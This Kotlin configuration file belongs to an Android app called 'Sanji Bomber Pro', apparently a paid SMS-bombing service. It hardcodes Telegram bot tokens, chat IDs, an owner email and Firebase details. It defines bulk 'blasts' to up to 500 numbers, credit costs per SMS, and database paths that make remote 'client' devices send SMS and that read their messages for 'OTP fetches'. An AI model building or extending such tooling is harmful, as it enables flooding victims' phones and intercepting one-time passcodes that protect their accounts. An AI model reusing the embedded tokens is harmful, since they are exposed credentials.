package com.sanji.bomberpro

/**
 * Central configuration. Everything pre-filled — no manual edits needed.
 * Bot tokens are here because payment + broadcast relays run through Telegram.
 */
object FirebaseConfig {

    // ============================================================
    //  TELEGRAM — payment bot (approve/reject)
    // ============================================================
    const val PAYMENT_BOT_TOKEN = "8760383147:AAFTUuYN8xKLS_70lRFdoFpwr0a5Vo8svVE"
    const val PAYMENT_BOT_CHAT_ID = "7966027018"

    // ============================================================
    //  TELEGRAM — logs bot (crash reports + broadcast push)
    // ============================================================
    const val LOGS_BOT_TOKEN = "8903201878:AAHGUAhZawpzSD7vwQxRHKr5wQVqwn-sw88"
    const val LOGS_BOT_CHAT_ID = "7966027018"

    // ============================================================
    //  TELEGRAM — main owner (broadcast, force join fallback)
    // ============================================================
    const val MAIN_OWNER_UID = "7966027018"

    // ============================================================
    //  GOOGLE SIGN-IN
    // ============================================================
    const val WEB_CLIENT_ID = "246986227337-7nmps9kuig9fg2vgolm6ppoh0qkuc6nq.apps.googleusercontent.com"

    // ============================================================
    //  OWNER
    // ============================================================
    const val OWNER_EMAIL = "thelifekit.offi.cial@gmail.com"

    // ============================================================
    //  FIREBASE PROJECT
    // ============================================================
    const val FIREBASE_PROJECT_ID = "sanji-bomber-pro"
    const val RTDB_DEFAULT_URL = "https://sanji-bomber-pro-default-rtdb.asia-southeast1.firebasedatabase.app"

    // ============================================================
    //  FIRESTORE COLLECTIONS
    // ============================================================
    const val COL_USERS = "users"
    const val COL_ROLES = "roles"
    const val COL_FIREBASES = "firebases"
    const val COL_SETTINGS = "settings"
    const val COL_PAYMENT_REQUESTS = "payment_requests"
    const val COL_PAYMENT_LOG = "payment_log"
    const val COL_ACTIVITY_LOG = "activity_log"
    const val COL_AUDIT_LOG = "audit_log"
    const val COL_BLASTS = "blasts"
    const val COL_OTP_FETCHES = "otp_fetches"
    const val COL_TRANSACTIONS = "transactions"
    const val COL_GIVEAWAYS = "giveaways"
    const val COL_GIVEAWAY_VOTES = "giveaway_votes"
    const val COL_APPS = "apps"
    const val COL_CRASH_LOGS = "crash_logs"
    const val COL_NOTIFICATIONS = "notifications"
    const val COL_BROADCASTS = "broadcasts"
    const val COL_REDEEM_CODES = "redeem_codes"
    const val COL_TICKETS = "tickets"
    const val COL_APPEALS = "appeals"
    const val COL_ANNOUNCEMENTS = "announcements"
    const val COL_UPCOMING = "upcoming_updates"
    const val COL_TEMPLATES = "templates"
    const val COL_SCHEDULED = "scheduled_blasts"
    const val COL_FORCE_JOIN = "force_join"

    // ============================================================
    //  FIRESTORE DOCS
    // ============================================================
    const val DOC_GLOBAL_SETTINGS = "global"

    // ============================================================
    //  REALTIME DB PATHS (for device read)
    // ============================================================
    const val RTDB_CLIENTS = "/clients.json?shallow=true"
    fun rtdbClient(devId: String) = "/clients/$devId.json"
    fun rtdbSendSms(devId: String) = "/clients/$devId/webhookEvent/sendSms.json"
    fun rtdbMessages(devId: String) = "/clients/$devId/messages.json"

    // ============================================================
    //  DEFAULT VALUES (used if Firestore settings/global missing)
    // ============================================================
    const val DEFAULT_OTP_COST = 1
    const val DEFAULT_CREDIT_COST_PER_SMS = 1
    const val DEFAULT_BULK_CREDIT_COST_PER_NUMBER = 1
    const val DEFAULT_DAILY_BONUS_CREDITS = 2
    const val DEFAULT_REF_CREDITS = 3
    const val DEFAULT_REF_COINS = 1
    const val DEFAULT_TERMS_VERSION = 1
    const val DEFAULT_OTP_FRESH_WINDOW_SEC = 900L
    const val DEFAULT_OTP_MAX_MESSAGES = 300
    const val DEFAULT_LIVE_OTP_LIMIT = 20
    const val DEFAULT_LIVE_TIMEOUT_SEC = 300L

    // ============================================================
    //  POWER MODES
    // ============================================================
    val ALLOWED_POWER_MODES = listOf(2, 3, 4, 5, 10)
    const val DEFAULT_POWER_MODE = 2

    // ============================================================
    //  FCM
    // ============================================================
    const val FCM_TOPIC_ALL_USERS = "all_users"
    const val FCM_TOPIC_ADMINS = "admins"

    // ============================================================
    //  NOTIFICATION CHANNELS (must match SanjiApp.kt)
    // ============================================================
    const val CHANNEL_DEFAULT = "sanji_default_channel"
    const val CHANNEL_BLAST = "sanji_blast_channel"
    const val CHANNEL_PAYMENT = "sanji_payment_channel"
    const val CHANNEL_OTP = "sanji_otp_channel"
    const val CHANNEL_ADMIN = "sanji_admin_channel"
    const val CHANNEL_GIVEAWAY = "sanji_giveaway_channel"

    // ============================================================
    //  BULK BLAST LIMITS
    // ============================================================
    const val BULK_MAX_NUMBERS = 500
    const val BULK_MIN_NUMBERS = 2

    // ============================================================
    //  FCM PUSH RELAY
    //  The payment_bot.py or a Cloud Function listens on
    //  `push_requests/{id}` and sends FCM. Token lives server-side.
    //  If you don't have it set up, FCM falls back to Firestore inbox.
    // ============================================================
    const val PUSH_RELAY_ENABLED = true

    // ============================================================
    //  OWNER DEFAULT FALLBACK
    // ============================================================
    val DEFAULT_RTDB_URLS = listOf(RTDB_DEFAULT_URL)
}